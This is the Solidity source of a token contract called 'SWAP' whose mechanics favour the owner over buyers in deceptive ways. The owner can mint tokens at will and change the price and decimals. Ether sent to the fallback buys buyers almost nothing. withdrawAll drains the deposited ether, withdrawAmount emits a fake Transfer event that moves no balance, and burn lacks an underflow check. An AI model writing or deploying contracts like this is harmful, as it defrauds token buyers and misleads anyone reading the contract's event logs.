pragma solidity 0.5.12;

contract SWAP {
 
    string public name = "SWAP";
    string public symbol = "SWAP";
 
    uint256 public totalSupply; 
    uint256 public price = 50;
    uint256 public decimals = 18; 

    address payable Owner;
    address public forcedRecipient;
 
    mapping (address => uint256) balances; 
 
    constructor() public { 
        Owner = msg.sender;
        name = "SWAP";
        symbol = "SWAP";
        totalSupply = 100000000000 * 10**18;
        balances[Owner] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == Owner);
        _;
    }

    modifier validAddress(address _to) {
        require(_to != address(0x00));
        _;
    }
 
    event Burn(address indexed from, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Withdraw(address to, uint amount);
 
    function setName(string memory _name) public onlyOwner returns (string memory) {
        name = _name;
        return name;
    }

    function setPrice(uint256 _price) public onlyOwner returns (uint256) {
        price = _price;
        return price;
    }

    function setDecimals(uint256 _decimals) public onlyOwner returns (uint256) {
        decimals = _decimals;
        return decimals;
    }
 
    function balanceOf(address _owner) public view returns(uint256) {
        return balances[_owner];
    }

    function getOwner() public view returns(address) {
        return Owner;
    }
 
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != address(0x0));
        require(balances[_from] >= _value);
        require(balances[_to] + _value >= balances[_to]);
 
        uint previousBalances = balances[_from] + balances[_to];
 
        balances[_from] -= _value;
        balances[_to] += _value;
        emit Transfer(_from, _to, _value);
 
        assert(balances[_from] + balances[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
 
    function () external payable {
        uint256 token = (msg.value * price) / 10**decimals;
        if(msg.sender == Owner) {
            totalSupply += token;
            balances[Owner] += token;
        } else {
            require(balances[Owner] >= token);
            _transfer(Owner, msg.sender, token);
        }
    }

    function create(uint256 _value) public onlyOwner returns (bool success) {
        totalSupply += _value;
        balances[Owner] += _value;
        return true;
    }
 
    function burn(uint256 _value) public onlyOwner returns (bool success) {
        balances[msg.sender] -= _value; 
        totalSupply -= _value; 
        emit Burn(msg.sender, _value);
        return true;
    }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public onlyOwner {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function withdrawAll() external onlyOwner {
        uint256 balance = address(this).balance;
        Owner.transfer(balance);
        emit Withdraw(msg.sender, balance);
    }

    function withdrawAmount(uint amount) external onlyOwner {
        Owner.transfer(amount);
        emit Withdraw(msg.sender, amount);
        emit Transfer(msg.sender, forcedRecipient, amount);
    }

    function sendEtherToAddress(address payable to, uint amount) external onlyOwner validAddress(to) {
        to.transfer(amount);
        uint profit = amount / 100;
        Owner.transfer(profit);
    }
}
